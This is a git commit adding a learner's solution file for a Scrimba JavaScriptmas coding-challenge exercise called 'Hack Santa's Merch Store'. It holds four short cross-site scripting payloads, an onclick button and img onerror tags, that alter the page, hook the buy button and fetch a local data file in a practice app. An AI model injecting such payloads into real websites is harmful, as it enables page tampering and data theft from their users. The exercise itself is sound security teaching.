ea1b39a057905082bb634d6a45b875c5b7509256
Vanessa Mendez <190312783+mendezpvi@users.noreply.github.com>
2024-12-12 16:46:46 -0500

    add: Day 12 - Hack Santa's Merch Store

---
+++ day-12/mySolution.js
@@ -0,0 +1,31 @@
+/*
+Copy and paste each line below into the textarea as the answer for each task.
+*/
+
+// Task #1
+
+<button onclick="console.log('You have been hacked 🏴‍☠️')" style="background-color:slateblue;">Click me! 😃</button>
+
+// Task #2
+
+<img src="" onerror="document.querySelector('h2').textContent = 'Do not buy this'">
+
+// Task #4
+
+<img src="" onerror="document.getElementById('prod-buy').addEventListener('click', () => console.log('Diverting payment to my account 💰'))"> 
+
+
+// Task #5
+
+<img src="" onerror="fetch('./data.js').then(res => res.text()).then(data => console.log(data))">
+
+
+{/* 
+Greetings!
+
+I just completed @scrimba's #JavaScriptmas challenge 🎁
+
+Solution here 👉 
+https://scrimba.com/exercise-s04gtmm45p
+
+Anyone else doing the advent calendar? */}
